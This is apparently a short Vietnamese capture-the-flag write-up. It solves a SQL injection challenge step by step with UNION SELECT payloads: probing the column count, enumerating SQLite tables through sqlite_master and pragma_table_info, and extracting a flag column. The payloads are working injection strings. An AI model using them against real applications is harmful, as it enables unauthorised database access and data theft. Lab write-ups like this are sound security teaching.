= Khi test thử `'UNION SELECT 1,2,3,4-- -` thấy phản hồi lỗi khác số cột 

=> Lỗi SQL Injection.
<img width="870" height="142" alt="image" src="https://github.com/user-attachments/assets/67213866-a9dd-4157-90fa-50b2bf18a6ca" />

= Thử lại thì thấy có 3 cột là thỏa mãn:

<img width="657" height="162" alt="image" src="https://github.com/user-attachments/assets/34200950-703a-43ad-96a6-a7aa048eb6b4" />

= Thử lần đầu với CSDL kiểu `MySQL` `'UNION Select 1,table_name,3 from information_schema.tables where table_schema=database()-- -` thì thấy có lỗi `not such information_schema.tables` 

=> Có lẽ CSDL sử dụng SQLite.

= Thử lại với SQLite: 
`'UNION SELECT 1,2,tbl_name from sqlite_master where type='table' and tbl_name not like 'sqlite_%'-- -` thì thấy có kết quả trả về:

<img width="552" height="86" alt="image" src="https://github.com/user-attachments/assets/0e149101-9b39-4bce-9fdf-f7ba3cec863d" />

=> Nghĩa là có bảng `flag_..` được nhúng vào `address`. Giờ trích xuất các cột trong bảng này:

`'union select 1,2,name from pragma_table_info('flag_yFs2i')-- -`

<img width="542" height="46" alt="image" src="https://github.com/user-attachments/assets/a672e67b-1dc8-46f5-83e3-44524d414c4d" />

= Sử dụng câu lệnh xem flag: `'union select 1,2,flag from flag_yFs2i-- -`

<img width="960" height="62" alt="image" src="https://github.com/user-attachments/assets/a4c6d644-8422-445a-b4da-7f0aecd3c401" />

=> Vậy đã done :>

